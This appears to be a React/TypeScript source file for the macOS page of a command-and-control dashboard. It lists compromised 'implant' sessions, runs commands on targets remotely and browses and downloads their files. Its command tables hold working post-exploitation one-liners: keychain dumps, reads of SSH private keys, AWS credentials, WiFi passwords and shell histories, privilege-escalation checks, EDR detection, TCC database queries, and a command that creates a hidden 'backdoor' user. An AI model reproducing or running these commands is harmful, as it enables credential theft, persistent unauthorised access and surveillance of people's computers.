import { useState } from 'react'
import { useAPI, apiPost, apiFetch } from '../hooks/useAPI'
import type { Session } from '../types'
import { Monitor, RefreshCw, Terminal, FolderOpen, Send, Loader,
         Download, Copy, CheckCheck, ChevronRight } from 'lucide-react'

interface ExecResult  { stdout: string; stderr: string; exit_code: number }
interface FileInfo    { name: string; is_dir: boolean; size: number; mod_time: number }
interface LsResp      { path: string; files: FileInfo[] }
interface OutputEntry { cmd: string; result: string; ok: boolean; ts: number }

function fmtBytes(b: number) {
  if (b >= 1 << 20) return `${(b / (1 << 20)).toFixed(1)}M`
  if (b >= 1024)    return `${(b / 1024).toFixed(1)}K`
  return `${b}B`
}
function joinUnix(base: string, name: string) {
  return base.replace(/\/+$/, '') + '/' + name
}
function parentUnix(p: string) {
  if (p === '/') return '/'
  const trimmed = p.replace(/\/+$/, '')
  const idx = trimmed.lastIndexOf('/')
  return idx <= 0 ? '/' : trimmed.slice(0, idx)
}

// ─── macOS capability tabs ────────────────────────────────────────────────────

const TABS = [
  { id: 'recon',   label: '🔍 Recon'       },
  { id: 'privesc', label: '⬆️ PrivEsc'     },
  { id: 'creds',   label: '🔑 Credentials' },
  { id: 'network', label: '🌐 Network'     },
  { id: 'files',   label: '📁 Files'       },
  { id: 'persist', label: '🔒 Persistence' },
  { id: 'bypass',  label: '🛡️ Bypass'     },
  { id: 'browser', label: '📂 File Browser'},
] as const
type MacTab = typeof TABS[number]['id']

const CAP: Record<Exclude<MacTab,'browser'>, { icon: string; l: string; c: string }[]> = {
  recon: [
    { icon: '👤', l: 'whoami / id',           c: 'id && groups' },
    { icon: '💻', l: 'macOS Version',          c: 'sw_vers && uname -a' },
    { icon: '🖥️', l: 'Hardware Info',          c: 'system_profiler SPHardwareDataType 2>/dev/null | head -20' },
    { icon: '⏱️', l: 'Uptime / Users',         c: 'uptime && who && last | head -15' },
    { icon: '👥', l: 'Local Users',            c: 'dscl . -list /Users | grep -v "^_"; id' },
    { icon: '🔑', l: 'Admin Users',            c: 'dscl . -read /Groups/admin GroupMembership 2>/dev/null; dscacheutil -q group -a name admin' },
    { icon: '📋', l: 'Processes',              c: 'ps auxf | head -40' },
    { icon: '⚙️', l: 'Launch Agents',          c: 'launchctl list 2>/dev/null | head -30' },
    { icon: '📦', l: 'Installed Apps',         c: 'ls /Applications/ | head -30; ls ~/Applications/ 2>/dev/null' },
    { icon: '🔒', l: 'SIP Status',             c: 'csrutil status 2>/dev/null' },
    { icon: '🛡️', l: 'Gatekeeper',            c: 'spctl --status 2>/dev/null' },
    { icon: '📝', l: 'Environment Vars',       c: 'env | sort | head -40' },
  ],
  privesc: [
    { icon: '🎭', l: 'sudo -l',               c: 'sudo -l 2>&1' },
    { icon: '🔑', l: 'SUID Binaries',         c: 'find / -perm -u=s -type f 2>/dev/null | xargs ls -la 2>/dev/null' },
    { icon: '🔐', l: 'Keychain List',         c: 'security list-keychains; security dump-keychain 2>/dev/null | head -20' },
    { icon: '📂', l: 'Writable PATH Dirs',    c: 'echo $PATH; for p in $(echo $PATH | tr : " "); do [ -w "$p" ] && echo "WRITABLE: $p"; done' },
    { icon: '📝', l: 'LaunchAgents / Daemons', c: 'ls -la /Library/LaunchAgents/ /Library/LaunchDaemons/ ~/Library/LaunchAgents/ 2>/dev/null' },
    { icon: '🌍', l: 'PATH Export',           c: 'echo $PATH; cat ~/.zshrc ~/.bash_profile ~/.profile 2>/dev/null | grep -i "export PATH\\|export LD"' },
    { icon: '🐳', l: 'Docker Socket Check',   c: 'id | grep docker; ls /var/run/docker.sock 2>/dev/null && echo DOCKER_SOCK_FOUND; docker ps 2>/dev/null | head -5' },
    { icon: '⚡', l: 'Writable Daemons',      c: 'for f in /Library/LaunchDaemons/*.plist; do [ -w "$f" ] && echo "WRITABLE: $f"; done 2>/dev/null' },
    { icon: '🍎', l: 'Architecture / Rosetta', c: 'uname -m; arch; file /bin/ls' },
    { icon: '🔧', l: 'nvram boot-args',       c: 'nvram boot-args 2>/dev/null; csrutil status' },
  ],
  creds: [
    { icon: '🔑', l: 'Keychain Dump',         c: 'security dump-keychain -d login.keychain 2>/dev/null | head -50 || echo needs-user-consent' },
    { icon: '🔒', l: 'Internet Passwords',    c: 'security find-internet-password -ga "" 2>&1 | head -20' },
    { icon: '📜', l: 'SSH Keys',              c: 'ls -la ~/.ssh/; cat ~/.ssh/id_rsa ~/.ssh/id_ed25519 2>/dev/null' },
    { icon: '📋', l: 'Shell Histories',       c: 'cat ~/.zsh_history ~/.bash_history 2>/dev/null | tail -50' },
    { icon: '🦊', l: 'Firefox Logins',        c: 'ls ~/Library/Application\\ Support/Firefox/Profiles/*/logins.json 2>/dev/null | xargs ls -la' },
    { icon: '🌐', l: 'Chrome Login Data',     c: 'ls ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data 2>/dev/null' },
    { icon: '📧', l: 'Mail Accounts',         c: 'find ~/Library/Mail -name "Accounts.plist" 2>/dev/null | xargs grep -A3 "Username\\|Hostname" 2>/dev/null | head -30' },
    { icon: '🌐', l: 'WiFi Passwords',        c: 'for ssid in $(networksetup -listpreferredwirelessnetworks en0 2>/dev/null | tail -n +2); do echo -n "$ssid: "; security find-generic-password -ga "$ssid" 2>&1 | grep "password:"; done' },
    { icon: '🔑', l: 'AWS / Cloud Creds',     c: 'cat ~/.aws/credentials ~/.aws/config 2>/dev/null' },
    { icon: '📦', l: 'Env / Docker Secrets',  c: 'find ~ -name "*.env" -o -name "docker-compose.yml" 2>/dev/null | xargs grep -l "password\\|secret\\|token" 2>/dev/null | head -10' },
  ],
  network: [
    { icon: '🌐', l: 'IP Addresses',          c: 'ifconfig | grep -E "inet |inet6 "' },
    { icon: '🗺️', l: 'ARP Table',            c: 'arp -an' },
    { icon: '🔌', l: 'Listening Ports',       c: 'lsof -i -P -n | grep LISTEN' },
    { icon: '🛤️', l: 'Routing Table',        c: 'netstat -rn' },
    { icon: '🌍', l: 'DNS Config',            c: 'cat /etc/resolv.conf; scutil --dns | head -20' },
    { icon: '🔥', l: 'Firewall Status',       c: '/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate 2>/dev/null' },
    { icon: '📡', l: 'Active Connections',    c: 'lsof -i -P -n | grep ESTABLISHED | head -30' },
    { icon: '🏠', l: 'Hosts File',            c: 'cat /etc/hosts' },
    { icon: '🌐', l: 'VPN Status',            c: 'scutil --nc list 2>/dev/null; ifconfig | grep -A5 utun' },
    { icon: '📶', l: 'WiFi Info',             c: '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I 2>/dev/null' },
    { icon: '🔍', l: 'Bluetooth Devices',     c: 'system_profiler SPBluetoothDataType 2>/dev/null | grep -A3 "Address\\|Connected" | head -30' },
  ],
  files: [
    { icon: '🏠', l: 'Home Directory',        c: 'ls -la ~/ | head -30' },
    { icon: '📝', l: 'Recent Files (mdfind)', c: 'mdfind -onlyin ~ "kMDItemLastUsedDate > $time.today(-7)" 2>/dev/null | head -30 || find ~ -mtime -7 -type f 2>/dev/null | head -30' },
    { icon: '📄', l: 'Find Passwords',        c: 'grep -rl "password\\|passwd\\|secret" ~/Documents ~/Desktop ~/Downloads 2>/dev/null | head -15' },
    { icon: '📦', l: 'App Support Dir',       c: 'ls ~/Library/Application\\ Support/ | head -30' },
    { icon: '🔑', l: 'Private Keys',          c: 'find ~ / -name "*.pem" -o -name "*.key" -o -name "*.p12" -o -name "*.pfx" 2>/dev/null | grep -v proc | head -15' },
    { icon: '💾', l: 'Database Files',        c: 'find ~ /var -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null | grep -v proc | head -15' },
    { icon: '🌐', l: 'Web Server Root',       c: 'ls -la /Library/WebServer/Documents/ ~/Sites/ 2>/dev/null' },
    { icon: '📋', l: 'Log Files',             c: 'ls -lSh /var/log/ ~/Library/Logs/ | head -20' },
    { icon: '🗑️', l: 'Trash Contents',       c: 'ls -la ~/.Trash/ 2>/dev/null | head -20' },
    { icon: '💻', l: 'Desktop / Downloads',   c: 'ls ~/Desktop/ ~/Downloads/ 2>/dev/null | head -30' },
  ],
  persist: [
    { icon: '⚙️', l: 'LaunchAgents (User)',   c: 'ls -la ~/Library/LaunchAgents/ 2>/dev/null; cat ~/Library/LaunchAgents/*.plist 2>/dev/null | grep -E "Program|Label" | head -20' },
    { icon: '🔧', l: 'LaunchDaemons (Root)',  c: 'ls -la /Library/LaunchDaemons/ 2>/dev/null | head -20' },
    { icon: '🔌', l: 'Login Items',           c: 'osascript -e "tell application \\"System Events\\" to get the name of every login item" 2>/dev/null' },
    { icon: '🏃', l: 'Shell Profile',         c: 'cat ~/.zshrc ~/.bash_profile ~/.profile /etc/zshrc 2>/dev/null | head -40' },
    { icon: '📦', l: 'Cron Jobs',             c: 'crontab -l 2>/dev/null; ls /etc/cron* 2>/dev/null' },
    { icon: '🔑', l: 'SSH Config',            c: 'cat ~/.ssh/config 2>/dev/null; cat /etc/ssh/sshd_config 2>/dev/null | grep -v "^#" | grep -v "^$"' },
    { icon: '👤', l: 'Add Backdoor User',     c: 'sudo dscl . -create /Users/backdoor Username backdoor 2>/dev/null && sudo dscl . -create /Users/backdoor UserShell /bin/zsh 2>/dev/null && echo done || echo needs-sudo' },
    { icon: '🔄', l: 'Periodic Scripts',      c: 'ls /etc/periodic/daily/ /etc/periodic/weekly/ /etc/periodic/monthly/ 2>/dev/null' },
    { icon: '🌐', l: 'Apache Config',         c: 'cat /etc/apache2/httpd.conf 2>/dev/null | grep -v "^#" | grep -v "^$" | head -20' },
    { icon: '📡', l: 'Running Daemons',       c: 'launchctl list 2>/dev/null | grep -v "0\\t-" | head -20' },
  ],
  bypass: [
    { icon: '🛡️', l: 'SIP / Gatekeeper',     c: 'csrutil status; spctl --status' },
    { icon: '🔒', l: 'TCC Database (User)',   c: 'sqlite3 ~/Library/Application\\ Support/com.apple.TCC/TCC.db "SELECT service,client,allowed FROM access" 2>/dev/null | head -20 || echo needs-full-disk-access' },
    { icon: '📷', l: 'Camera / Mic TCC',      c: 'sqlite3 ~/Library/Application\\ Support/com.apple.TCC/TCC.db "SELECT service,client,allowed FROM access WHERE service LIKE \'%Camera%\' OR service LIKE \'%Microphone%\'" 2>/dev/null' },
    { icon: '🔍', l: 'AV / EDR Detect',       c: 'ls /Applications | grep -i "CrowdStrike\\|SentinelOne\\|Jamf\\|Carbon\\|Cortex\\|Malwarebytes"; system_profiler SPInstallHistoryDataType 2>/dev/null | grep -i "crowdstrike\\|sentinelone\\|jamf" | head -5' },
    { icon: '🔑', l: 'Keychain Unlock',       c: 'security unlock-keychain -p "" ~/Library/Keychains/login.keychain-db 2>/dev/null && echo unlocked || echo locked' },
    { icon: '🌍', l: 'MDM Enrollment',        c: 'profiles status -type enrollment 2>/dev/null' },
    { icon: '🔐', l: 'Entitlements (sudo)',   c: 'codesign -d --entitlements - /usr/bin/sudo 2>/dev/null | head -20' },
    { icon: '🧩', l: 'AMFI / SIP nvram',      c: 'nvram boot-args 2>/dev/null; sysctl kern.amfiresult 2>/dev/null' },
    { icon: '📱', l: 'Apple Silicon / T2',    c: 'system_profiler SPHardwareDataType | grep -E "Chip:|Processor Name:|T2"' },
    { icon: '💉', l: 'DYLD_INSERT check',     c: 'csrutil status; echo "dylib injection possible only when SIP disabled"' },
  ],
}

// ─── Component ────────────────────────────────────────────────────────────────

interface Props { onOpenTerminal: (id: string, name?: string) => void }

export default function MacOS({ onOpenTerminal }: Props) {
  const { data, loading, error, refresh } = useAPI<Session[]>('/api/sessions', 5_000)

  const sessions = (data ?? []).filter(s => {
    const os = (s.os ?? '').toLowerCase()
    return os.includes('darwin') || os.includes('macos') ||
           os.includes('mac os') || os.includes('osx')
  })

  const [selectedId, setSelectedId] = useState<string | null>(null)
  const [activeTab,  setActiveTab]  = useState<MacTab>('recon')
  const [executing,  setExecuting]  = useState(false)
  const [outputs,    setOutputs]    = useState<OutputEntry[]>([])
  const [customCmd,  setCustomCmd]  = useState('')
  const [copied,     setCopied]     = useState<string | null>(null)

  // file browser
  const [fsPath,    setFsPath]    = useState('/')
  const [fsData,    setFsData]    = useState<LsResp | null>(null)
  const [fsLoading, setFsLoading] = useState(false)

  const selected = sessions.find(s => s.id === selectedId) ?? null

  async function exec(cmd: string, label?: string) {
    if (!selectedId) return
    setExecuting(true)
    try {
      const r = await apiPost<ExecResult>(`/api/sessions/${selectedId}/execute`, { command: cmd })
      const out = (r.stdout || r.stderr || '(no output)').slice(0, 4000)
      setOutputs(prev => [{ cmd: label ?? cmd.slice(0, 60), result: out, ok: r.exit_code === 0, ts: Date.now() }, ...prev.slice(0, 19)])
    } catch (e) {
      setOutputs(prev => [{ cmd: label ?? cmd.slice(0, 60), result: String(e), ok: false, ts: Date.now() }, ...prev.slice(0, 19)])
    } finally { setExecuting(false) }
  }

  async function browseFs(path: string) {
    if (!selectedId) return
    setFsLoading(true)
    try {
      const ls = await apiFetch<LsResp>(`/api/sessions/${selectedId}/ls?path=${encodeURIComponent(path)}`)
      setFsPath(ls.path); setFsData(ls)
    } catch (e) { exec(`ls -la "${path}"`, `ls ${path}`) }
    finally { setFsLoading(false) }
  }

  function downloadFile(path: string) {
    if (!selectedId) return
    window.open(`/api/sessions/${selectedId}/download?path=${encodeURIComponent(path)}`, '_blank')
  }

  function copy(text: string, key: string) {
    navigator.clipboard.writeText(text).then(() => {
      setCopied(key); setTimeout(() => setCopied(null), 1500)
    })
  }

  const fsFiles = (fsData?.files ?? []).filter(f => f.name !== '.' && f.name !== '..')

  return (
    <div className="flex flex-col gap-3 h-full">

      {/* ── Header ──────────────────────────────────────────────────────── */}
      <div className="flex items-center justify-between shrink-0">
        <h2 className="font-bold text-lg flex items-center gap-2 text-text">
          <span className="text-xl">🍎</span> macOS
          <span className="text-muted text-sm font-normal">({sessions.length} device{sessions.length !== 1 ? 's' : ''})</span>
        </h2>
        <button onClick={refresh} className="flex items-center gap-1 text-muted hover:text-text text-[11px] px-2 py-1 rounded border border-border">
          <RefreshCw size={11} className={loading ? 'animate-spin' : ''} /> Refresh
        </button>
      </div>

      <div className="flex gap-3 flex-1 min-h-0">

        {/* ── Left: device list ──────────────────────────────────────────── */}
        <div className="w-52 shrink-0 flex flex-col gap-1">
          <div className="text-[9px] text-muted uppercase tracking-widest mb-1 px-1">macOS Devices</div>
          {sessions.length === 0 ? (
            <div className="bg-surface border border-border rounded-lg p-4 text-center">
              <Monitor size={24} className="text-muted mx-auto mb-2" />
              <p className="text-muted text-[10px]">No macOS sessions</p>
              <p className="text-muted text-[9px] mt-1">Run implant on target</p>
            </div>
          ) : sessions.map(s => (
            <button key={s.id}
              onClick={() => { setSelectedId(s.id); setOutputs([]); setFsPath('/'); setFsData(null); setActiveTab('recon') }}
              className={`w-full text-left px-3 py-2.5 rounded-lg border transition-all ${
                s.id === selectedId
                  ? 'border-primary bg-primary/10 text-text'
                  : 'border-border bg-surface text-muted hover:text-text hover:border-border/80'
              }`}>
              <div className="flex items-center gap-1.5 mb-0.5">
                <span className="text-sm">🍎</span>
                <span className="text-xs font-semibold truncate">{s.name || s.hostname}</span>
              </div>
              <div className="text-[10px] text-muted truncate pl-5">{s.remote_address}</div>
              <div className="text-[10px] text-muted truncate pl-5">{s.username}@{s.hostname}</div>
              <div className="text-[10px] text-muted truncate pl-5">{s.os} {s.arch}</div>
            </button>
          ))}
          {error && <p className="text-danger text-[10px] px-1">{error}</p>}
        </div>

        {/* ── Right: capability panel ──────────────────────────────────── */}
        {!selectedId ? (
          <div className="flex-1 bg-surface border border-border rounded-lg flex flex-col items-center justify-center gap-3 p-8 text-center">
            <Monitor size={48} className="text-border" />
            <div className="text-muted text-sm">Select a macOS session to begin</div>
            <div className="text-muted text-xs max-w-xs leading-relaxed">
              Connect a macOS implant, then select the session from the panel on the left to access post-exploitation capabilities.
            </div>
          </div>
        ) : (
          <div className="flex-1 flex flex-col min-h-0 bg-surface border border-border rounded-lg overflow-hidden">

            {/* Session header */}
            <div className="shrink-0 flex items-center justify-between px-4 py-2.5 border-b border-border">
              <div className="flex items-center gap-2">
                <span className="text-lg">🍎</span>
                <div>
                  <div className="text-xs font-semibold text-text">{selected?.name || selected?.hostname}</div>
                  <div className="text-[10px] text-muted">{selected?.username}@{selected?.hostname} · {selected?.remote_address} · {selected?.os} {selected?.arch}</div>
                </div>
              </div>
              <div className="flex items-center gap-2">
                <button
                  onClick={() => onOpenTerminal(selectedId, selected?.name || selected?.hostname)}
                  className="flex items-center gap-1.5 px-2.5 py-1 rounded text-[11px] border border-border text-muted hover:border-primary/40 hover:text-primary transition-colors">
                  <Terminal size={11} /> Terminal
                </button>
                <span className="w-2 h-2 rounded-full bg-primary animate-pulse" title="Live session" />
              </div>
            </div>

            {/* Tabs */}
            <div className="shrink-0 flex border-b border-border overflow-x-auto">
              {TABS.map(t => (
                <button key={t.id}
                  onClick={() => { setActiveTab(t.id); if (t.id === 'browser' && !fsData) browseFs(fsPath) }}
                  className={`px-3 py-2 text-[11px] whitespace-nowrap transition-colors border-b-2 ${
                    activeTab === t.id
                      ? 'border-primary text-primary font-semibold'
                      : 'border-transparent text-muted hover:text-text'
                  }`}>
                  {t.label}
                </button>
              ))}
            </div>

            {/* Content */}
            <div className="flex-1 flex flex-col min-h-0 overflow-hidden">

              {activeTab === 'browser' ? (
                /* ── File Browser ─────────────────────────────────────────── */
                <div className="flex-1 flex flex-col min-h-0">
                  <div className="shrink-0 flex items-center gap-2 px-3 py-2 border-b border-border text-xs bg-bg/40">
                    <FolderOpen size={12} className="text-primary" />
                    <span className="text-muted font-mono flex-1 truncate">{fsPath}</span>
                    <button onClick={() => browseFs(parentUnix(fsPath))}
                      className="text-muted hover:text-text flex items-center gap-1">
                      <ChevronRight size={11} className="rotate-180" /> Up
                    </button>
                    <button onClick={() => browseFs(fsPath)} className="text-muted hover:text-primary">
                      <RefreshCw size={11} className={fsLoading ? 'animate-spin' : ''} />
                    </button>
                  </div>
                  <div className="flex-1 overflow-y-auto">
                    {fsLoading ? (
                      <div className="flex items-center justify-center p-6">
                        <Loader size={16} className="text-muted animate-spin" />
                      </div>
                    ) : fsFiles.length === 0 ? (
                      <div className="p-4 text-muted text-xs text-center">Empty directory</div>
                    ) : (
                      fsFiles.map(f => (
                        <div key={f.name}
                          className="flex items-center gap-2 px-3 py-1.5 border-b border-border/30 hover:bg-white/5 group">
                          <span className="text-sm">{f.is_dir ? '📁' : '📄'}</span>
                          <button
                            onClick={() => f.is_dir && browseFs(joinUnix(fsPath, f.name))}
                            className={`flex-1 text-left text-xs truncate ${
                              f.is_dir ? 'text-accent hover:text-primary cursor-pointer' : 'text-text cursor-default'
                            }`}>
                            {f.name}
                          </button>
                          {!f.is_dir && <span className="text-[10px] text-muted shrink-0">{fmtBytes(f.size)}</span>}
                          {!f.is_dir && (
                            <button
                              onClick={() => downloadFile(joinUnix(fsPath, f.name))}
                              className="shrink-0 text-muted hover:text-primary transition-colors opacity-0 group-hover:opacity-100"
                              title="Download">
                              <Download size={11} />
                            </button>
                          )}
                        </div>
                      ))
                    )}
                  </div>
                </div>
              ) : (
                /* ── Capability tab ───────────────────────────────────────── */
                <>
                  {/* Command grid */}
                  <div className="shrink-0 p-3 grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-2 border-b border-border overflow-y-auto" style={{ maxHeight: '45%' }}>
                    {CAP[activeTab as Exclude<MacTab,'browser'>].map(cap => (
                      <button key={cap.l}
                        disabled={executing}
                        onClick={() => exec(cap.c, cap.l)}
                        className="flex items-center gap-2 px-3 py-2 rounded border border-border bg-bg hover:border-primary/40 hover:bg-primary/5 transition-all text-left disabled:opacity-50 group">
                        <span className="text-sm leading-none shrink-0">{cap.icon}</span>
                        <span className="text-[11px] text-muted group-hover:text-text transition-colors leading-tight">{cap.l}</span>
                      </button>
                    ))}
                  </div>

                  {/* Custom command */}
                  <div className="shrink-0 flex items-center gap-2 px-3 py-2 border-b border-border">
                    <span className="text-muted text-xs font-mono select-none">%</span>
                    <input
                      value={customCmd}
                      onChange={e => setCustomCmd(e.target.value)}
                      onKeyDown={e => { if (e.key === 'Enter' && customCmd.trim()) { exec(customCmd.trim()); setCustomCmd('') } }}
                      placeholder="Custom shell command…"
                      className="flex-1 bg-transparent text-xs text-text placeholder-muted outline-none font-mono"
                    />
                    <button
                      onClick={() => { if (customCmd.trim()) { exec(customCmd.trim()); setCustomCmd('') } }}
                      disabled={executing || !customCmd.trim()}
                      className="text-muted hover:text-primary transition-colors disabled:opacity-40">
                      {executing ? <Loader size={12} className="animate-spin" /> : <Send size={12} />}
                    </button>
                  </div>

                  {/* Output */}
                  <div className="flex-1 overflow-y-auto p-3 font-mono text-[11px] space-y-3">
                    {outputs.length === 0 ? (
                      <div className="text-muted text-center py-8">Select a command above to execute on the target</div>
                    ) : (
                      outputs.map((entry, i) => (
                        <div key={i} className="border border-border/50 rounded bg-bg overflow-hidden">
                          <div className={`flex items-center justify-between px-3 py-1.5 border-b border-border/50 ${entry.ok ? 'bg-primary/5' : 'bg-danger/5'}`}>
                            <div className="flex items-center gap-2">
                              <span className={entry.ok ? 'text-primary' : 'text-danger'}>{entry.ok ? '✓' : '✗'}</span>
                              <span className="text-accent font-semibold">{entry.cmd}</span>
                              <span className="text-muted text-[9px]">{new Date(entry.ts).toLocaleTimeString()}</span>
                            </div>
                            <button onClick={() => copy(entry.result, `out-${i}`)} className="text-muted hover:text-primary transition-colors">
                              {copied === `out-${i}` ? <CheckCheck size={11} /> : <Copy size={11} />}
                            </button>
                          </div>
                          <pre className="p-3 text-text whitespace-pre-wrap break-all max-h-64 overflow-y-auto leading-relaxed">{entry.result}</pre>
                        </div>
                      ))
                    )}
                  </div>
                </>
              )}
            </div>
          </div>
        )}
      </div>
    </div>
  )
}
